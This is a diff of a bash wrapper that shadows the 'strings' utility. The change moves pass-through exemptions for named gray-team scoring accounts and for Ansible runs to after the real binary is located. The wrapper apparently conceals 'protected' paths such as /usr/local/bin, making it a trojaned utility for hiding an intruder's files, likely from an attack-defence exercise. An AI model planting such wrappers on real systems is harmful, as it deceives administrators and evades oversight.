@@ -1,11 +1,6 @@
 #!/bin/bash
 REAL_STRINGS=""
 
-# Pass straight through for gray team scoring accounts
-case "$(whoami)" in
-    kingneptune|paintythepirate|greyteamadmin) exec $REAL_STRINGS "$@" ;;
-esac
-
 for _p in /usr/bin/strings /usr/lib/binutils/strings /usr/bin/strings.gnu; do
     [ -x "$_p" ] && { REAL_STRINGS="$_p"; break; }
 done
@@ -13,6 +8,16 @@ if [ -z "$REAL_STRINGS" ]; then
     REAL_STRINGS=$(command -v strings 2>/dev/null | grep -v /usr/local/bin || true)
 fi
 [ -z "$REAL_STRINGS" ] && { echo "strings: command not found" >&2; exit 127; }
+
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_STRINGS "$@" ;;
+esac
+
+# Pass straight through if running under Ansible
+if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
+    exec $REAL_STRINGS "$@"
+fi
 
 PROTECTED=(
     "/usr/local/bin"
@@ -31,11 +36,6 @@ _is_protected() {
     done
     return 1
 }
-
-# Pass straight through if running under Ansible
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
-    exec $REAL_STRINGS "$@"
-fi
 
 FLAGS=()
 SAFE_ARGS=()
